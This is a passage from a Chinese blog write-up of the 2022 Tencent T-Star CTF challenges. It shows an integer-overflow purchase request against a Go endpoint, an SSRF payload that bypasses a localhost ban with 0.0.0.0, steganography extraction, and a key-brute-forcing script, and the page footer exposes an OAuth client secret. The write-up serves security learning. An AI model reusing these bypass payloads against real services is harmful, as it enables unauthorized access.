+<p>解码得到</p>
+<pre class="line-numbers language-none"><code class="language-none">19910386797<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>当成密码解压得到 flag.txt</p>
+<pre class="line-numbers language-none"><code class="language-none">https://darknet.hacker5t2ohub.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><del><em>（所以这个手机号会不会有用呢</em></del>  后来发现没用</p>
+<h2 id="赛题五-不眠之夜"><a href="#赛题五-不眠之夜" class="headerlink" title="赛题五 不眠之夜"></a>赛题五 不眠之夜</h2><blockquote>
+<p>这个网址！你知道！这是一个搜索引擎无法捕捉的地方，一个黑暗的平行世界。在这个世界里，毒品、信息贩卖、军火交易、谋杀等一系列被法律所禁止的事情，都得到了罪恶土壤，一切交易都通过平台上特定的货币隐秘地进行。</p>
+<p>据说只要有<strong>「足够」</strong>的钱，你能买到任何需要的信息。</p>
+<p>这个网站里会不会有你需要的线索？他们可靠吗？</p>
+<p>未知，恰恰最能激起你的征服欲。</p>
+<p>你决定铤而走险，向黑市进发。</p>
+<p>提示：需要先解出第4题获得入口，会一点点Go更佳，flag为T-Star{字符串}中的字符串</p>
+</blockquote>
+<p>上一题的网址 <a target="_blank" rel="noopener" href="https://darknet.hacker5t2ohub.com/">https://darknet.hacker5t2ohub.com/</a></p>
+<p>拿qq登录</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142504147.png"></p>
+<p><em><del>（啥小电影啊多来点</del></em> 快暴打出题人</p>
+<p>直接买那个 1000 的付费咨询。试了下购买这里 amount 用了 ParseInt，存在整数溢出。</p>
+<p>那到底是多大才能溢出呢？</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=4294967296&amp;gid=0x9
+==&gt;
+{"code":1, "msg":"service codec Unmarshal: 1 error(s) decoding:
+
+* cannot parse 'amount' as int: strconv.ParseInt: parsing "4294967296": value out of range"}
+
+GET /trpc.cors_filter_test.common.Darknet/Purchase?amount=65536&amp;gid=0x9
+==&gt;
+{"code":500, "msg":"商品数量非法，请重试"}
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后各种试了发现是 33 34 溢出，唔……</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142014556.png"></p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">GET</span> /trpc.cors_filter_test.common.Darknet/Purchase?amount=34&amp;gid=0x9 HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> darknet.hacker5t2ohub.com
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+<span class="token header-name keyword">Accept:</span> application/json, text/javascript, */*; q=0.01
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate, br
+<span class="token header-name keyword">Authorization:</span> xxxxx
+<span class="token header-name keyword">X-Requested-With:</span> XMLHttpRequest
+<span class="token header-name keyword">Connection:</span> keep-alive
+<span class="token header-name keyword">Referer:</span> https://darknet.hacker5t2ohub.com/item.html?gid=12
+<span class="token header-name keyword">Cookie:</span> sTok=xxxxx
+<span class="token header-name keyword">Sec-Fetch-Dest:</span> empty
+<span class="token header-name keyword">Sec-Fetch-Mode:</span> cors
+<span class="token header-name keyword">Sec-Fetch-Site:</span> same-origin
+<span class="token header-name keyword">Pragma:</span> no-cache
+<span class="token header-name keyword">Cache-Control:</span> no-cache
+<span class="token header-name keyword">TE:</span> trailers
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>再看余额就能随便买东西了。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142039075.png"></p>
+<p>这感觉还有点精心设计了，只有33、34可以满足条件。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142136834.png"></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142126830.png"></p>
+<blockquote>
+<p>赛后才发现确实是 golang 的特性，是因为总价格卡在了 int16 的边界。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">int8 <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">128</span> to <span class="token number">127</span>
+int16 <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">32768</span> to <span class="token number">32767</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>而 1000 * 33 或者 1000 * 34 正好 &gt; 32767 实现溢出，再大就库存不足了。</p>
+</blockquote>
+<p>这时候再看收件箱</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422141946940.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">商品【付费咨询】购买成功，信息如下： 前往微信公众号“腾讯安全应急响应中心”(tsrc_team)，回复"T-Star666"获取信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>离谱，又是套娃。</p>
+<p>回复后得到：</p>
+<pre class="line-numbers language-none"><code class="language-none">你要找的人，即将发起大范围蠕虫攻击！行动计划就藏匿在邮件中，只有解出密匙才能破除攻击！http://159.75.190.64/
+
+nightbaron042@sohu.com
+nightBaron1996<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>怎么又是这玩意，微博和比赛介绍里都见过。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142646388.png"></p>
+<p><a target="_blank" rel="noopener" href="https://mail.sohu.com/">https://mail.sohu.com</a> 拿上面的邮箱和密码登录一下。</p>
+<p>（赛后才发现原来微博那张图的桌面上贴了张纸条，上面就有密码，乐</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422142936960.png"></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422143254673.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Hi bros,
+
+冬去春来，终于迎来此刻。等待良久，时机已经成熟。等待的日子里，我看了很多书，那些书页中的章节和段落就像时钟的时针和分针一样不断前行，指引我们通向胜利。
+
+这次行动一切顺利，我将乘胜追击，发起勒索病毒蠕虫攻击，对所有目标电脑文件进行加密，并自动扩散，只有我的KEY才能解密。
+
+数据勒索加密行动已经于今天 1点8分 启动。须知，T-Star特工诡计多端，为防他们从中作梗，我已将KEY进行HASH处理，分别交由不同的人保管。以他们的算力，应该很难破解。米特尼克曾经写道，人的因素是安全过程中最薄弱的环节。各位务必提高警惕，严加保密、妥善储存。
+
+这封邮件非常重要，关键时刻将发挥巨大作用，好戏在即，各位拭目以待。
+
+Key Hashes Part 1: https://pastebin.com/QZ7QBmmd
+
+
+
+
+NightBaron
+Address: Soldier Island 
+
+Github: nightBaron042
+
+
+IF YOU'RE LOOKING, YOU WON'T FIND IT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>同理，拿到另外两部分 hash。</p>
+<pre class="line-numbers language-none"><code class="language-none">Key Hashes Part 2: https://pastebin.com/TUNVRVvk
+Key Hashes Part 3: https://pastebin.com/rTqtad96<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>麻了，是一堆 hash。</p>
+<p>瞄了眼 GitHub <a target="_blank" rel="noopener" href="https://github.com/nightbaron042">https://github.com/nightbaron042</a> ，发现没啥用，好像还是去年留下的？</p>
+<p>没办法，拿去 <a target="_blank" rel="noopener" href="https://www.somd5.com/batch.html">somd5</a> 和 <a target="_blank" rel="noopener" href="https://www.cmd5.com/b.aspx">cmd5</a> 氪金搜了下，解得了部分明文。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422172908330.png"></p>
+<p>寻思着是不是每个作为一个 key 当成字典发过去？</p>
+<p>写了个脚本试试。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'parts.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    d <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+l <span class="token operator">=</span> d<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> k <span class="token keyword">in</span> l<span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">"key"</span><span class="token punctuation">:</span> quote<span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    h <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://159.75.190.64/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">'key错误'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> <span class="token string">'error'</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'!!!!!!!!!!!!!!!!!!'</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> <span class="token string">'ok'</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可惜不是。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422173047372.png"></p>
+<p>又看了看这感觉像一段话啊，拼起来得到</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment"># Securit is too often merely anion,ionmes made even worsebility, naivete, orance come into play. The mostctedtist of the twentieth Albert isquoted as two things areinfinite, the universe and humanstupidity, I'm not sure about Inend, social engineeringattacks can succeed when people stupidor, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious many information technology (IT) professionals hold to the misconception that made their companies largely immune to attack because deployed standard security products - firewalls, intrusion detection or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>咕咕噜加上引号强制匹配搜了一下，找到原文了！</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422173130382.png"></p>
+<p><a target="_blank" rel="noopener" href="https://pt.slideshare.net/ragazome/kevin-mitnick-the-art-of-deception?smtNoRedir=1">https://pt.slideshare.net/ragazome/kevin-mitnick-the-art-of-deception?smtNoRedir=1</a></p>
+<p>Kevin Mitnick - The Art of Deception 凯文米特尼克《欺骗的艺术》</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422161419384.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Security is too often merely an illusion, an illusion sometimes made even worse when gullibility, naivete, or ignorance come into play. The world's most respected scientist of the twentieth century, Albert Einstein, is quoted as saying, "Only two things are infinite, the universe and human stupidity, and I'm not sure about the former." In the end, social engineering attacks can succeed when people are stupid or, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious homeowner, many information technology (IT) professionals hold to the misconception that they've made their companies largely immune to attack because they've deployed standard security products - firewalls, intrusion detection systems, or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks that security products alone offer true security is settling for. the illusion of security. It's a case of living in a world of fantasy: They will inevitably, later if not sooner, suffer a security incident.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p>另外，看了官方 wp 才知道原来邮件里的 1点8分 是说第一章的第8段。。</p>
+</blockquote>
+<p>把这段话复制一下，当成 key 拿去提交，得到 flag。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422160929653.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">key正确，恭喜恢复电脑，快去提交flag吧：flag{ski931iwasjudqwkashajdsakdhadjshakdhsahkd}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（麻了，其实事实上没必要花费那么多次数来解 md5，直接搜前几个词就行</p>
+<blockquote>
+<p><strong>Reference &amp; Extended Reading</strong></p>
+<p><a target="_blank" rel="noopener" href="https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">golang的一些安全问题</a></p>
+</blockquote>
+<h2 id="赛题六-恢复文档"><a href="#赛题六-恢复文档" class="headerlink" title="赛题六 恢复文档"></a>赛题六 恢复文档</h2><blockquote>
+<p>借助网站的帮助，你终于成功恢复了电脑。</p>
+<p>但……这个文档？这个文档里又是什么？</p>
+<p>这一切都是某个人不怀好意的玩笑吗？</p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197/0615giqrzc8ab524761/guess">http://175.178.148.197/0615giqrzc8ab524761/guess</a></p>
+<p>提示：包含多个小关卡，请提交最后一关flag，flag为T-Star{字符串}中的字符串.</p>
+</blockquote>
+<p>010editor 瞄一眼文件，嗯熟悉的 word，随手改后缀名为 <code>.docx</code></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421005501364.png"></p>
+<p>（这里的 flag2 是隐藏文字。</p>
+<pre class="line-numbers language-none"><code class="language-none">喜欢我给你的惊喜吗？
+我已将线索藏到三个不同的地方，
+其中一个提示为123456
+来找我吧，
+记住，你只能一个人来
+否则，你会受到惩罚哦
+
+Flag2 : 772e91/webs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>后面还有一张图。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421005513997.png"></p>
+<p>docx 当成压缩包打开，在 <code>word/document.xml</code> 里看到了一串奇怪的字符。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421011350925.png"></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421011343582.png"></p>
+<p>看起来设置了一个书签，名称为 <code>GE3TKLRRG44C4MJUHAXDCOJX</code>。</p>
+<p>base32 decode，得到 <code>175.178.148.197</code>（怎么还是这个 IP……</p>
+<p>下面图片的描述提示了 <code>屏幕上有字&amp;#xA;&amp;#xA;描述已自动生成</code>，感觉没啥用，应该是 word 自动生成的描述吧（</p>
+<p>再看图片，熟练地从docx压缩包里提取出来，然后试了各种隐写工具，最后发现是 outguess。。<del>（噢我没注意看 docx 名字</del></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ outguess -r -k <span class="token string">"123456"</span> image1.jpg data.bin
+Reading image1.jpg<span class="token punctuation">..</span><span class="token punctuation">..</span>
+Extracting usable bits:   <span class="token number">88951</span> bits
+Steg retrieve: seed: <span class="token number">109</span>, len: <span class="token number">15</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到</p>
+<pre class="line-numbers language-none"><code class="language-none">/062ycz7s9458b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>拼接一下，<del>175.178.148.197/772e91/webs/062ycz7s9458b</del></p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197/062ycz7s9458b772e91/webs/">http://175.178.148.197/062ycz7s9458b772e91/webs/</a></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421171527210.png"></p>
+<p>可恶的套娃，是 SSRF 啊。那么 flag 在哪呢？</p>
+<p>试了下 file 协议发现不行。</p>
+<p>随手试了下 <a target="_blank" rel="noopener" href="http://175.178.148.197/062ycz7s9458b772e91/webs/flag.php">http://175.178.148.197/062ycz7s9458b772e91/webs/flag.php</a></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421172452601.png"></p>
+<p>那就拿 SSRF 访问这玩意好了。</p>
+<p>ban 了 127.0.0.1，拿 0.0.0.0 绕过就行。<em>（发现 [::] 不行 2333</em></p>
+<p>或者用 127.0.0.2 也行。</p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197/062ycz7s9458b772e91/webs/?url=http://0.0.0.0/062ycz7s9458b772e91/webs/flag.php">http://175.178.148.197/062ycz7s9458b772e91/webs/?url=http://0.0.0.0/062ycz7s9458b772e91/webs/flag.php</a></p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421172626907.png"></p>
+<p><code>T-STAR{ThereAreNoBoundaries}</code></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>摸了，终于 AK 了，咱第17名……</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220427035716230.png"></p>
+<p>怎么说呢，感觉总体上题目偏向 CTF 比赛中的 Misc 和 Web，质量还是说得过去的，还是比较有趣的，相对于 某 src 开展的活动质量高不少，hhh</p>
+<p>虽然感觉题目挺套娃的就是了……以及最让咱脑洞的居然是第一题那个 XXE，100分的题目居然这么难想到，而第二题随便猜就能猜到，挺离谱的。</p>
+<p>另外，好多个题目都用了同一个靶机，相当于 flag 的第一部分等于白送了，也正因为如此，前几天的时候服务器巨卡，第一题虽然说了不要用扫描器，但还是一堆人同时访问，肯定也有人在扫，没办法更加卡了。</p>
+<p>不知道是不是主办方经费有限的原因，反正建议下次可以的话每个题多设置几台靶机，做题体验还是比较重要的。</p>
+<p>不管怎么说，多多少少还是学到了点知识的，那就写到这里吧。</p>
+<blockquote>
+<p>官方 writeup 也出来了：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1986640">【官方题解】腾讯网络安全T-Star高校挑战赛write up</a></p>
+</blockquote>
+<p>同时，也欢迎师傅们来「Funny Web CTF」和朋友们讨论有趣的话题的喵~ <a target="_blank" rel="noopener" href="https://t.zsxq.com/7y7iAuf">https://t.zsxq.com/7y7iAuf</a></p>
+<p><em>（溜了溜了喵~</em></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz/2022/04/26/CTF_2022T-Star/">https://miaotony.xyz/2022/04/26/CTF_2022T-Star/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特别声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <!-- 
+                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
+                        -->
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <!-- 
+                        <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
+                        </div> 
+                -->
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '116343b4650fce4789b6',
+        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
+        repo: 'miaotony.github.io',
+        owner: 'miaotony',
+        admin: "miaotony",
+        id: '2022-04-26T20-30-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/04/26/CTF_2022T-Star/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/13.jpg" class="responsive-img" alt="CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp">
+                        
+                        <span class="card-title">CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前几天AK了个腾讯的T-Star高校挑战赛，题目比较偏向Misc和Web，这里记录一下解题过程。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/25/CTF_2022HFCTF/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/5.jpg" class="responsive-img" alt="CTF | 2022 数字中国创新大赛虎符网络安全赛道 初赛 WriteUp">
+                        
+                        <span class="card-title">CTF | 2022 数字中国创新大赛虎符网络安全赛道 初赛 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            上周末打了下虎符CTF，感觉题目总体而言难度挺大，也就Misc方向相对来说简单一点了，于是来玩了玩。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('200')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
